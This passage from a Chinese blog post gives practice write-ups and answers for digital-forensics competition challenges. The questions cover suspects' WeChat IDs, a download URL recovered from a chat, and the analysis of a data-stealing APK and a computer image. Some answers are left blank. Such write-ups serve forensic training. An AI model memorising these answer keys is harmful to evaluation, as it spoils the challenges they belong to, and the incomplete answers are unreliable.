class="line"></span><br><span class="line">### 手机部分-4</span><br><span class="line"></span><br><span class="line">+ 嫌疑人李某的微信内部ID是？</span><br><span class="line">+ 答案：`wxid_wnigmud8aj6j12`</span><br><span class="line"></span><br><span class="line">+ 直接翻微信的就可以找到</span><br><span class="line"></span><br><span class="line">![image-20241101213653007](电子数据取证刷题1/image-20241101213653007.png)</span><br><span class="line"></span><br><span class="line">### 手机部分-5</span><br><span class="line"></span><br><span class="line">+ 嫌疑人李某发送给技术人员的网站源码下载地址是什么？</span><br><span class="line">+ 答案：`http://www.honglian7001.com/down`</span><br><span class="line">+ 这题逻辑比较清晰，案件交代有老赵和老李，现场还有服务器，而老李不是技术人员，老赵可能是技术人员，所以找微信聊天记录备注为赵的，一下就找到了</span><br><span class="line"></span><br><span class="line">![image-20241101214344266](电子数据取证刷题1/image-20241101214344266.png)</span><br><span class="line"></span><br><span class="line">+ 找到结果为一个二维码，扫描该二维码会得到一个，新约佛论禅加密的密文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>新佛曰：諸隸僧殿降吽諸陀摩隸殿僧殿缽殿薩願僧殿宣摩殿嚴願殿是迦咒叻吶嚤須塞亦須阿隸嚤須愍眾殿蜜殿隸願蜜哆蜜亦願是念慧殿隸摩哆殿即隸嚤訶須隸亦愍如如殿囑殿囑</p>
<pre class="highlight"><code class>
+ 解密后就得到对应的下载网址了

![image-20241101214631337](电子数据取证刷题1/image-20241101214631337.png)

### 手机部分-6

+ 受害者微信用户ID是？
+ 答案：`limoon890`
+ 这里也是直接寻找受害者的微信

![image-20241101214757409](电子数据取证刷题1/image-20241101214757409.png)

### 手机部分-7

+ 嫌疑人李某第一次连接WIFI的时间是？
+ 答案：``

### 手机部分-8

+ 分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？
+ 答案：` 16:00-18:00`

+ 查看聊天记录，得到李某的发言时间是在 16:00-18:00最活跃

![image-20241101215320734](电子数据取证刷题1/image-20241101215320734.png)

### 手机部分-9

+ 请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？
+ 答案：``

# 2024獬豸杯

## APK分析

### 题目1 APK分析1

+ APP包名是多少。（标准格式：com.xxx.xxx）
+ 答案：`com.example.readeveryday`
+ 直接火眼取证一把梭

![image-20241104231906293](电子数据取证刷题1/image-20241104231906293.png)

### 题目2 APK分析2

+ apk的主函数名是多少。（标准格式：comlongxin）

+ 答案：`StartShow`

+ 直接反编译查看

![image-20241104232403870](电子数据取证刷题1/image-20241104232403870.png)

+ 或者火眼一把梭

![image-20241104232558226](电子数据取证刷题1/image-20241104232558226.png)

### 题目3 APK分析3

+ apk的签名算法是什么。
+ 答：``

+ 签名算法要看反编译这边的

![image-20241104232743021](电子数据取证刷题1/image-20241104232743021.png)

+ 虽然火眼也可以看得到，但是俩个说法不一样

![image-20241104232807627](电子数据取证刷题1/image-20241104232807627.png)

### 题目4 APK4

+ apk的应用版本是多少。（标准格式：1.2）
+ 答案：`1.0`
+ 还是继续查看反编译的

![image-20241104232946862](电子数据取证刷题1/image-20241104232946862.png)

### 题目5 APK5

+ 请判断该apk是否需要联网。
+ 答案：`是`
+ 还是直接火眼一把锁

![image-20241104233045973](电子数据取证刷题1/image-20241104233045973.png)

### 题目6 APK6

+ APK回传地址？（标准格式：127.0.0.1:12345）
+ 答案：`10.0.102.135:8888`
+ 这题正常做可能还要抓包，但是这题直接就字符串搜索即可

![image-20241104234036747](电子数据取证刷题1/image-20241104234036747.png)

### 题目7 APK7

+ APK回传数据文件名称是什么。（标准格式：1.txt）
+ 答案：`Readdata.zip`
+ 还是找或者抓包

![image-20241104234258573](电子数据取证刷题1/image-20241104234258573.png)

### 题目8 APK8

+ APK回传数据加密密码是多少。（标准格式：admin）
+ 答案：``
+ 

### 题目9 APK9

+ APK发送回后台服务器的数据包含以下哪些内容？（多选）

## 计算机取证

### 题目10 基本信息-1

+ 计算机系统的安装日期是什么时候。（标准格式：20240120）
+ 答案：`20240112`
+ 火眼一把梭

![image-20241105001331102](电子数据取证刷题1/image-20241105001331102.png)

### 题目11 系统痕迹1

+ 请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）
+ 答案：`data.zip`
+ 直接火眼一把梭

![image-20241105001450353](电子数据取证刷题1/image-20241105001450353.png)

### 题目12 数据库分析-1

</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://iyheart.github.io">iyheart</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://iyheart.github.io/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/">http://iyheart.github.io/2024/10/19/电子数据取证/电子数据取证刷题1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://iyheart.github.io" target="_blank">iyheart的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/下载.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" target="_blank"><img class="post-qr-code-img" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/ea2e5fb6fbb4c236fbabd387ef83339.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/27/CTFblog/%E5%8C%BA%E5%9D%97%E9%93%BE/Web3%E4%BB%8B%E7%BB%8D/" title="Web3介绍"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover115.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web3介绍</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/16/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86off-by%E7%B3%BB%E5%88%97/" title="off-by系列"><img class="cover" src="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover88.png" onerror="onerror=null;src='https://raw.githubusercontent.com/iyheart/tuchuang/main/img/f3c2605738aabdeedbc687356fa0e4e5.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">off-by系列</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">iyheart</div><div class="author-info__description">悟已往之不谏，知来者之可追</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">170</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">52</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text"> 2021第三届长安杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%901"><span class="toc-number">2.1.</span> <span class="toc-text"> 检材1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 题目1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 题目2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 题目3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 题目4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5"><span class="toc-number">2.1.5.</span> <span class="toc-text"> 题目5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE6"><span class="toc-number">2.1.6.</span> <span class="toc-text"> 题目6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE7"><span class="toc-number">2.1.7.</span> <span class="toc-text"> 题目7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE8"><span class="toc-number">2.1.8.</span> <span class="toc-text"> 题目8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE9"><span class="toc-number">2.1.9.</span> <span class="toc-text"> 题目9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE10"><span class="toc-number">2.1.10.</span> <span class="toc-text"> 题目10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE11"><span class="toc-number">2.1.11.</span> <span class="toc-text"> 题目11*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%902"><span class="toc-number">2.2.</span> <span class="toc-text"> 检材2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE12"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 题目12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE13"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 题目13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE14"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 题目14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE15"><span class="toc-number">2.2.4.</span> <span class="toc-text"> 题目15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE16"><span class="toc-number">2.2.5.</span> <span class="toc-text"> 题目16*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE17"><span class="toc-number">2.2.6.</span> <span class="toc-text"> 题目17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE18"><span class="toc-number">2.2.7.</span> <span class="toc-text"> 题目18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE19"><span class="toc-number">2.2.8.</span> <span class="toc-text"> 题目19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE20"><span class="toc-number">2.2.9.</span> <span class="toc-text"> 题目20</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE21"><span class="toc-number">2.2.10.</span> <span class="toc-text"> 题目21</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%903"><span class="toc-number">2.3.</span> <span class="toc-text"> 检材3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE22"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 题目22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE23"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 题目23*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE24"><span class="toc-number">2.3.3.</span> <span class="toc-text"> 题目24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE25"><span class="toc-number">2.3.4.</span> <span class="toc-text"> 题目25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE26"><span class="toc-number">2.3.5.</span> <span class="toc-text"> 题目26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE27"><span class="toc-number">2.3.6.</span> <span class="toc-text"> 题目27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE28"><span class="toc-number">2.3.7.</span> <span class="toc-text"> 题目28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE29"><span class="toc-number">2.3.8.</span> <span class="toc-text"> 题目29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE30"><span class="toc-number">2.3.9.</span> <span class="toc-text"> 题目30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE31"><span class="toc-number">2.3.10.</span> <span class="toc-text"> 题目31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE32"><span class="toc-number">2.3.11.</span> <span class="toc-text"> 题目32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE33"><span class="toc-number">2.3.12.</span> <span class="toc-text"> 题目33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE34"><span class="toc-number">2.3.13.</span> <span class="toc-text"> 题目34*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE35"><span class="toc-number">2.3.14.</span> <span class="toc-text"> 题目35*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE36"><span class="toc-number">2.3.15.</span> <span class="toc-text"> 题目36*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE37"><span class="toc-number">2.3.16.</span> <span class="toc-text"> 题目37*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE38"><span class="toc-number">2.3.17.</span> <span class="toc-text"> 题目38*</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%904"><span class="toc-number">2.4.</span> <span class="toc-text"> 检材4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE39"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 题目39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE40"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 题目40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE41"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 题目41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE42"><span class="toc-number">2.4.4.</span> <span class="toc-text"> 题目42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE43"><span class="toc-number">2.4.5.</span> <span class="toc-text"> 题目43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE44"><span class="toc-number">2.4.6.</span> <span class="toc-text"> 题目44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE45"><span class="toc-number">2.4.7.</span> <span class="toc-text"> 题目45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE46"><span class="toc-number">2.4.8.</span> <span class="toc-text"> 题目46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE47"><span class="toc-number">2.4.9.</span> <span class="toc-text"> 题目47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE48"><span class="toc-number">2.4.10.</span> <span class="toc-text"> 题目48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE49"><span class="toc-number">2.4.11.</span> <span class="toc-text"> 题目49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE50"><span class="toc-number">2.4.12.</span> <span class="toc-text"> 题目50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE51"><span class="toc-number">2.4.13.</span> <span class="toc-text"> 题目51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE52"><span class="toc-number">2.4.14.</span> <span class="toc-text"> 题目52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE53"><span class="toc-number">2.4.15.</span> <span class="toc-text"> 题目53</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E9%99%87%E5%89%91%E6%9D%AF"><span class="toc-number">3.</span> <span class="toc-text"> 2021陇剑杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt"><span class="toc-number">3.1.</span> <span class="toc-text"> jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1-jwt1"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 题目1 jwt1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2-jwt2"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 题目2 jwt2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3-jwt3"><span class="toc-number">3.1.3.</span> <span class="toc-text"> 题目3 jwt3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE4-jwt4"><span class="toc-number">3.1.4.</span> <span class="toc-text"> 题目4 jwt4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5-jwt5"><span class="toc-number">3.1.5.</span> <span class="toc-text"> 题目5 jwt5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE6-jwt6"><span class="toc-number">3.1.6.</span> <span class="toc-text"> 题目6 jwt6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text"> 日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE7-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%901"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 题目7 日志分析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE8-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%902"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 题目8 日志分析2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE9-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%903"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 题目9 日志分析3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text"> 简单日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE10-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%901"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 题目10 简单日志分析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE11-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%902"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 题目11 简单日志分析2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE12-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%903"><span class="toc-number">3.3.3.</span> <span class="toc-text"> 题目12 简单日志分析3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text"> SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE13-sql%E6%B3%A8%E5%85%A51"><span class="toc-number">3.4.1.</span> <span class="toc-text"> 题目13 SQL注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE14-sql%E6%B3%A8%E5%85%A52"><span class="toc-number">3.4.2.</span> <span class="toc-text"> 题目14 SQL注入2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE15-sql%E6%B3%A8%E5%85%A53"><span class="toc-number">3.4.3.</span> <span class="toc-text"> 题目15 SQL注入3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wifi"><span class="toc-number">3.5.</span> <span class="toc-text"> WIFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE16-wifi1"><span class="toc-number">3.5.1.</span> <span class="toc-text"> 题目16 WIFI1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90"><span class="toc-number">3.6.</span> <span class="toc-text"> 内存分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE18-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%901"><span class="toc-number">3.6.1.</span> <span class="toc-text"> 题目18 内存分析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE19%E5%86%85%E5%AD%98%E5%88%86%E6%9E%902"><span class="toc-number">3.6.2.</span> <span class="toc-text"> 题目19内存分析2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ios"><span class="toc-number">3.7.</span> <span class="toc-text"> IOS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE20-ios1"><span class="toc-number">3.7.1.</span> <span class="toc-text"> 题目20 IOS1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE21-ios2"><span class="toc-number">3.7.2.</span> <span class="toc-text"> 题目21 IOS2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE22-ios3"><span class="toc-number">3.7.3.</span> <span class="toc-text"> 题目22 IOS3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE23-ios4"><span class="toc-number">3.7.4.</span> <span class="toc-text"> 题目23 IOS4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE24-ios5"><span class="toc-number">3.7.5.</span> <span class="toc-text"> 题目24 IOS5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE25-ios6"><span class="toc-number">3.7.6.</span> <span class="toc-text"> 题目25 IOS6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE26-ios7"><span class="toc-number">3.7.7.</span> <span class="toc-text"> 题目26 IOS7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">3.8.</span> <span class="toc-text"> webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE27-webshell1"><span class="toc-number">3.8.1.</span> <span class="toc-text"> 题目27 webshell1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE28-webshell2"><span class="toc-number">3.8.2.</span> <span class="toc-text"> 题目28 webshell2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE29-webshell3"><span class="toc-number">3.8.3.</span> <span class="toc-text"> 题目29 webshell3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE30-webshell4"><span class="toc-number">3.8.4.</span> <span class="toc-text"> 题目30 webshell4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE31-webshell5"><span class="toc-number">3.8.5.</span> <span class="toc-text"> 题目31 webshell5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE32-webshell6"><span class="toc-number">3.8.6.</span> <span class="toc-text"> 题目32 webshell6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE33-webshell7"><span class="toc-number">3.8.7.</span> <span class="toc-text"> 题目33 webshell7</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%9B"><span class="toc-number">4.</span> <span class="toc-text"> 2021美亚杯个人赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%94%B5%E8%AF%9D%E7%9A%84%E5%BE%AE%E4%BF%A1%E8%B4%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.1.</span> <span class="toc-text"> 题目1工地主管电话的微信账号是什么?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84%E9%9A%94%E7%A9%BA%E6%8A%95%E9%80%81%E8%A3%85%E7%BD%AE%E7%BD%AE%E7%BC%96%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.2.</span> <span class="toc-text"> 题目2工地主管的隔空投送装置置编号是什么?(请以英文全大写及阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE3%E5%8D%95%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%94%B5%E8%AF%9D%E7%9A%84%E5%93%AA%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9C%89%E5%85%B3%E4%BA%8E%E7%BB%8F%E7%BA%AC%E5%BA%A624490474-118110220%E7%9A%84%E7%BA%AA%E5%BD%95%E4%BB%85%E4%B8%80%E6%AC%A1%E7%AD%94%E9%A2%98%E6%9C%BA%E4%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text"> 题目3**(单选题)** 工地主管电话的哪一个应用程序有关于经纬度24.490474, 118.110220的纪录?仅一次答题机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 